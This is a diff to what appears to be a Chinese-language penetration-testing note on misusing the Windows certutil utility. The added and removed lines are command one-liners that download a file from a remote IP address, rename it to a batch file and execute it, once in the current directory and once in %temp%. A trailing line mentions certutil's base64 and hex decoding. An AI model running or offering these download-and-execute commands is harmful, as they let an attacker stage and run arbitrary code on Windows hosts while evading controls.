@@ -53,9 +53,9 @@ Path
 - 低版本certutil不支持指定下载的目录，为了兼容性可以直接在当前目录操作
 
 ```php
-certutil -urlcache -split -f http://47.92.194.173/test.txt&ren 1.txt 1.bat&1.bat
+certutil -urlcache -split -f http://172.16.111.182/url.txt&ren url.txt 1.bat&1.bat
 或者
-certutil -urlcache -split -f http://47.92.194.173/test.txt %temp%\1.bat&%temp%\1.bat
+certutil -urlcache -split -f http://172.16.111.182/url.txt %temp%\1.bat&%temp%\1.bat
 ```
 
 Certutil也支持base64加解密以及16进制解密
